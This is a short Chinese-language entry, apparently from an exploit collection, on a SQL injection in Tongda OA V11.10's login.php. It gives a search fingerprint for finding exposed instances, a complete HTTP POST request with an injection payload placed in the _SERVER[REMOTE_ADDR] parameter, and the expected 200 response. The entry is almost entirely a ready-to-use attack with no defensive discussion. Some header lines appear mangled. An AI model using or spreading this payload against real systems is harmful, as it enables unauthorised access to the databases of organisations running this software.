# 通达OAV11.10login.phpSQL注入漏洞

通达OA ｜ SQL注入 ｜ —
- **指纹**：`app.name="通达 OA"`

**Payload**
```
POST/ispirit/interface/login.php HTTP/1.1
AppleWebKit/537.36(KHTML,likeGecko)Chrome/69.0.855.2Safari/537.36
Content-Type:application/x-www-form-urlencoded
Host:
Content-Length:107
name=123\&pass=123&\_SERVER\[REMOTE\_ADDR]=1','10',(select+@`,'`+or+if(1%
3d0,1,(select+~0%2b1))+limit+0,1))--+'
```
- **响应特征**：200